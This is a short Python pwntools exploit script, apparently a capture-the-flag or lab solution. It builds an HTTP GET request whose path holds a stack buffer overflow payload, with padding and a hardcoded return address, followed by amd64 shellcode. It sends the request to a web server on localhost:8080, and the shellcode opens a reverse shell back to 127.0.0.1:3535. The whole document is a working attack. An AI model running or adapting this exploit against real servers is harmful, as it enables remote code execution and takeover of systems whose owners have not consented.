from pwn import *

context.arch = "amd64"

sh = asm(
    shellcraft.connect("127.0.0.1", 3535) + shellcraft.findpeersh()
)  # reverse shell shellcode
payload = b"a" * 160 + b"\0" * 8 + b"b" * 64 + b"\x5e\x10\x40\x00\x00\x00\x00\x00" + sh
payload += b"c" * (256 - len(payload) % 256)
io = remote("localhost", 8080)
io.send(b"GET /" + payload + b" HTTP")
io.interactive()
